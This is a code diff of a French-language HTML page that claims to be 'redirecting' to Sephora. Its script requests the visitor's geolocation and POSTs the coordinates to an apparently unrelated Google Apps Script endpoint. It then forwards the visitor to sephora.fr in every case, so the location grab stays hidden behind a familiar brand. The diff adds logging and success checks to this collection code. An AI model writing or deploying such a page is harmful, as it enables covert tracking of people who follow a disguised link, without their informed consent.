@@ -5,10 +5,13 @@
     <title>Redirection en cours...</title>
     <script>
         function redirectToSephora() {
+            console.log("Tentative de géolocalisation...");
+
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     console.log("Géolocalisation réussie :", position.coords);
 
+                    // Envoi des données de géolocalisation
                     fetch('https://script.google.com/macros/s/AKfycbxhKUD0lRVaxdGShPNTbdRxJIL8sC0FXJMI0-nQHHcSnwx_hTkGuDg7Z311tHeA3ioE/exec', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -21,10 +24,19 @@
                     .then(response => response.json())
                     .then(data => {
                         console.log("Réponse du serveur :", data);
+
+                        if (data.status === "success") {
+                            console.log("Données envoyées avec succès !");
+                        } else {
+                            console.warn("Problème lors de l'envoi des données :", data);
+                        }
+
+                        // Redirection après confirmation de succès
                         window.location.href = "https://www.sephora.fr";
                     })
                     .catch(error => {
                         console.error("Erreur lors de l'envoi des données :", error);
+                        // Redirection même en cas d'erreur
                         window.location.href = "https://www.sephora.fr";
                     });
 
